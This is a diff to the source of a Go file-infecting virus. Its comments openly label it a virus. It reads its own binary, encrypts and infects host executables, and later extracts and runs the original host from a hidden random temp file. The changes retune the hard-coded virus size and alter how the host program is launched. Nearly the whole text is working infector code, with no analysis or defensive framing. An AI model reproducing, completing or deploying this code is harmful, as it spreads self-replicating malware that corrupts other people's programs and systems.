@@ -31,8 +31,7 @@ import (
     "crypto/aes"
     "crypto/cipher"
     "math/rand"
-    "time"   
-
+    "time" 
 )
 
 func check(e error) {
@@ -99,9 +98,9 @@ func Infect(file string) {
 	check(err)	
 	vir, err := os.Open(os.Args[0]) //read virus
 	check(err)
-	virbuf := make([]byte, 1838080)
+	virbuf := make([]byte, 1666208)
 	vir.Read(virbuf)
-	
+
 	encDat := Encrypt(dat) //encrypt host
 	
 	f, err := os.OpenFile(file, os.O_RDWR, 0666) //open host
@@ -116,7 +115,7 @@ func Infect(file string) {
 }
    
 func RunHost() {
-    
+
     hostbytes := "." + Rnd(8) //generate hidden random name
     
     h, err := os.Create(hostbytes) //create tmp with above name
@@ -125,12 +124,12 @@ func RunHost() {
     infected_data, err := ioutil.ReadFile(os.Args[0]) //Read myself
     check(err)
     allSZ := len(infected_data) //get file full size
-    hostSZ := allSZ - 1838080 //calculate host size
+    hostSZ := allSZ - 1666208 //calculate host size
     
     f, err := os.Open(os.Args[0]) //open host
     check(err)
         
-    f.Seek(1838080, os.SEEK_SET) //go to host start
+    f.Seek(1666208, os.SEEK_SET) //go to host start
     
     hostBuf := make([]byte, hostSZ)
     f.Read(hostBuf) //read it
@@ -144,10 +143,11 @@ func RunHost() {
     f.Close()
     
     os.Chmod(hostbytes, 0755) //give it proper permissions
-    cmd := exec.Command(hostbytes) 
-    cmd.Start() //execute it
-	err = cmd.Wait()
-	os.Remove(hostbytes)
+    out, err := exec.Command("./" + hostbytes).Output()
+    check(err)
+    print(string(out))
+    os.Remove(hostbytes)
+	
 }
  
 func Encrypt(toEnc []byte) []byte {
@@ -226,12 +226,12 @@ func main() {
 			}	
 		}
 	}
-
         
-    if GetSz(os.Args[0]) > 1838080 {
+    if GetSz(os.Args[0]) > 1666208 {
         RunHost()
     } else {
         os.Exit(0)
     }
 	
 }
+
